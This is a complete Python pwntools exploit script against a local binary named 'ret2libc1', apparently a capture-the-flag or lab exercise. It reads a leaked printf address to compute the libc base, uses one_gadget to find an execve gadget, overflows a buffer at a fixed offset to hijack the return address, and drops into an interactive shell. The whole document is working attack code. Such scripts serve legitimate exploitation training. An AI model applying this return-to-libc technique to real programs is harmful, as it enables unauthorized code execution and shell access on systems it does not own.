#!/bin/python3

from pwn import *
import os


binaryName = 'ret2libc1'


# get the address of libc file with ldd
libc_loc = os.popen(f'ldd {binaryName}').read().split('\n')[1].strip().split()[2]
print(libc_loc)
# use one_gadget to see where execve is in that libc file
one_gadget_libc_execve_out = [int(i.split()[0], 16) for i in os.popen(f'one_gadget {libc_loc}').read().split("\n") if "execve" in i]

# pick one of the suitable addresses
libc_execve_address = one_gadget_libc_execve_out[1]


p = process(f'./{binaryName}')
e = ELF(f'./{binaryName}')
l = ELF(libc_loc)

# get the address of printf from the binary output
printf_loc = int(p.recvuntil('\n').rstrip(), 16)

# get the address of printf from libc
printf_libc = l.sym['printf']

# calculate the base address of libc
libc_base_address = printf_loc - printf_libc

# generate payload

# 0x17 is from gdb analysis of offset from input to return address
offset = 0x17

payload = b"A"*offset
payload += p64(libc_base_address + libc_execve_address)


# send the payload
p.sendline(payload)

# enter in interactive so we can use the shell created from our execve payload
p.interactive()



